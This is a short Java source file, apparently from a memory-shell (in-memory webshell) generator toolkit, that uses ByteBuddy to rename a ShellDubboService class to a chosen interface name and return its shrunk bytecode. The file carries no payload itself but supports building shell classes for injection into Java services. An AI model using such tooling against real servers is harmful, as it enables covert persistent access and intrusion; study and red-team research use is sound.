package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.shelltool.ShellDubboService;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;

public class DubboServiceInterfaceHelperGenerator {
    public static byte[] getBytes(String interfaceName, ShellConfig shellConfig) {
        try (DynamicType.Unloaded<ShellDubboService> make = new ByteBuddy()
                .redefine(ShellDubboService.class)
                .name(interfaceName)
                .make()) {
            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
        }
    }
}
